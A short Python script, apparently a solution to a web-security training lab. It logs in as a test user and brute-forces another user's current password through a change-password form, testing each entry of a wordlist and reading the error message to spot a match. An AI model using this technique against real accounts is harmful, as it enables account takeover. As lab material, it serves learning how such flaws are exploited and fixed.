import os
import requests

def get_password_wordlist() -> list[str]:
    script_dir = os.path.dirname(os.path.abspath(__file__))
    parent_dir = os.path.dirname(script_dir)
    passwords_path = os.path.join(parent_dir, '../wordlists', 'passwords.txt')
    with open(passwords_path, 'r') as f:
        return f.read().splitlines()
    

def authenticate(LAB_URL):
    session = requests.Session()
    creds = {
        "username": "wiener",
        "password": "peter"
    }
    s = session.post(f"{LAB_URL}/login", data=creds)
    if "Your username is: wiener" in s.text:
        print("Authenticated successfully!")
        return session
    else:
        print("Authentication failed.")
        return None
    
def brute_force_password_change(authenticated_session, LAB_URL, password):
    
    data = {
        "username": "carlos",
        "current-password": password,
        "new-password-1": "123",
        "new-password-2": "1234"
    }
    r = authenticated_session.post(f"{LAB_URL}/my-account/change-password", data=data)
    if "Current password is incorrect" not in r.text:
        print(f"Original password: {password}")
        print(f"New password: 123")
        return True
    print("No valid password found.")
    return False





if __name__ == "__main__":
    passwords = get_password_wordlist()
    LAB_URL = input("Enter the lab URL: ")


    for password in passwords:
        authenticated_user = authenticate(LAB_URL)
        if brute_force_password_change(authenticated_user, LAB_URL, password):
            break
